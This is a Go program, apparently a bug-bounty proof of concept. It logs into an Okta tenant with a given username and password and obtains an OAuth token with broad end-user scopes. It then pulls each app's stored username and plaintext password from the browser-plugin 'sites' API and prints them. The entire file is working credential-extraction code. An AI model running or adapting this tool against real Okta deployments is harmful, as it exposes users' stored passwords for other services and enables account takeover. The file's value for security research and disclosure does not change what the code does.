package main

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"

	"golang.org/x/oauth2"
)

type SiteResponse struct {
	Sites []struct {
		ScriptURI string `json:"scriptURI"`
	} `json:"site"`
}

type FlowResponse struct {
	Scripts struct {
		Script []struct {
			Action []struct {
				Username string `json:"username"`
				Password string `json:"password"`
			} `json:"action"`
		} `json:"script"`
	} `json:"scripts"`
}

func getSidForClient(client *http.Client, baseUrl *url.URL, username, password string) error {
	resp, err := client.Get(baseUrl.String())
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	idx := strings.Index(string(body), "var stateToken = '") + 18
	if idx < 0 {
		return fmt.Errorf("Failed to find state token in body")
	}

	idx2 := strings.Index(string(body[idx:]), "'")

	stateToken := string(body[idx:idx+idx2])

	cookies := client.Jar.Cookies(baseUrl)
	cookies = append(cookies, &http.Cookie{Name: "oktaStateToken", Value: stateToken})
	client.Jar.SetCookies(baseUrl, cookies)

	b2 := map[string]interface{}{
		"username": username,
		"options": map[string]bool{
			"warnBeforePasswordExpired":true,
			"multiOptionalFactorEnroll":true,
		},
		"stateToken": stateToken,
	}
	b2raw, err := json.Marshal(b2)
	if err != nil {
		return err
	}

	authnUrl, err := baseUrl.Parse("/api/v1/authn")
	if err != nil {
		return err
	}

	_, err = client.Post(authnUrl.String(), "application/json", bytes.NewBuffer(b2raw))
	if err != nil {
		return err
	}

	b3 := map[string]interface{}{
		"password": password,
		"stateToken": stateToken,
	}
	b3raw, err := json.Marshal(b3)
	if err != nil {
		return err
	}

	passUrl, err := baseUrl.Parse("/api/v1/authn/factors/password/verify")
	if err != nil {
		return err
	}

	_, err = client.Post(passUrl.String(), "application/json", bytes.NewBuffer(b3raw))
	if err != nil {
		return err
	}

	redirUrl, err := baseUrl.Parse("/login/token/redirect")
	if err != nil {
		return err
	}

	q := url.Values{}
	q.Set("stateToken", stateToken)
	redirUrl.RawQuery = q.Encode()

	_, err = client.Get(redirUrl.String())
	if err != nil {
		return err
	}

	return nil
}

func getOauthToken(client *http.Client) (*oauth2.Token, error) {
	verifier := oauth2.GenerateVerifier()
	config := &oauth2.Config{
		ClientID: "okta.2b1959c8-bcc0-56eb-a589-cfcfb7422f26",
		Endpoint: oauth2.Endpoint {
			AuthURL: "https://bugcrowd-sigint-1.oktapreview.com/oauth2/v1/authorize",
			TokenURL: "https://bugcrowd-sigint-1.oktapreview.com/oauth2/v1/token",
		},
		RedirectURL: "https://bugcrowd-sigint-1.oktapreview.com/enduser/callback",
		Scopes: []string{"openid", "profile", "email", "okta.users.read.self",
			"okta.users.manage.self", "okta.internal.enduser.read",
			"okta.internal.enduser.manage", "okta.enduser.dashboard.read",
			"okta.enduser.dashboard.manage"},
	}

	url := config.AuthCodeURL("state", 
		oauth2.SetAuthURLParam("nonce", "lWqTSVTcG2NgnNh6UVShUauVsvCEHJBQXIULeZSGDzyTQKMAvFdDavwtPwroHavT"),
		oauth2.S256ChallengeOption(verifier))

	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}

	loc, err := resp.Location()
	if err != nil {
		return nil, err
	}
	code := loc.Query().Get("code")

	return config.Exchange(context.Background(), code, oauth2.VerifierOption(verifier))
}

func NewCookieJarClient() (*http.Client, error) {
	jar, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: nil})
	if err != nil {
		return nil, err
	}

	return &http.Client{
		Jar: jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}, nil

}

type Options struct {
	username		string
	password		string
	baseUrl			*url.URL
	instanceName	string
	appId			string
}

func handleCLI() (Options, error) {
	rawUrl := flag.String("url", "", "The Okta URL to get the password for")
	username := flag.String("username", "", "The Okta username")
	password := flag.String("password", "", "The Okta password")

	flag.Parse()

	if rawUrl == nil || username == nil || password == nil {
		return Options{}, fmt.Errorf("Failed to provide correct commands")
	}

	parsedUrl, err := url.Parse(*rawUrl)
	if err != nil {
		return Options{}, err
	}

	pathParts := strings.Split(strings.Trim(parsedUrl.Path, "/"), "/")

	if len(pathParts) != 4 {
		return Options{}, fmt.Errorf("Improperly formatted URL")
	}

	instanceName := pathParts[1]
	appId := pathParts[2]

	return Options {
		username: *username,
		password: *password,
		baseUrl: &url.URL {
			Scheme: "https",
			Host: parsedUrl.Host,
		},
		instanceName: instanceName,
		appId: appId, 
	}, nil
}

func main() {
	options, err := handleCLI()
	if err != nil {
		panic(err)
	}

	username := options.username
	password := options.password
	baseUrl := options.baseUrl
	// instanceName := options.instanceName
	// appId := options.appId

	client, err := NewCookieJarClient()
	if err != nil {
		panic(err)
	}

	err = getSidForClient(client, baseUrl, username, password)
	if err != nil {
		panic(err)
	}

	token, err := getOauthToken(client)
	if err != nil {
		panic(err)
	}

	sitesUrl, err := baseUrl.Parse("/api/plugin/2/sites")
	if err != nil {
		panic(err)
	}

	req, err := http.NewRequest("GET", sitesUrl.String(), nil)
	if err != nil {
		panic(err)
	}

	token.SetAuthHeader(req)

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	siteJson := SiteResponse{}

	err = json.NewDecoder(resp.Body).Decode(&siteJson)
	if err != nil {
		panic(err)
	}

	fmt.Println(siteJson.Sites[0].ScriptURI)

	for _, site := range siteJson.Sites {
		passwordUrl, err := baseUrl.Parse(site.ScriptURI)
		if err != nil {
			panic(err)
		}

		req, err = http.NewRequest("GET", passwordUrl.String(), nil)
		if err != nil {
			panic(err)
		}

		req.Header.Add("Accept", "application/json")

		resp, err = client.Do(req)
		if err != nil {
			panic(err)
		}

		respJson := FlowResponse{}

		err = json.NewDecoder(resp.Body).Decode(&respJson)
		if err != nil {
			panic(err)
		}

		data := respJson.Scripts.Script[0].Action[0]

		fmt.Printf("%s/%s\n", data.Username, data.Password)
	}
}
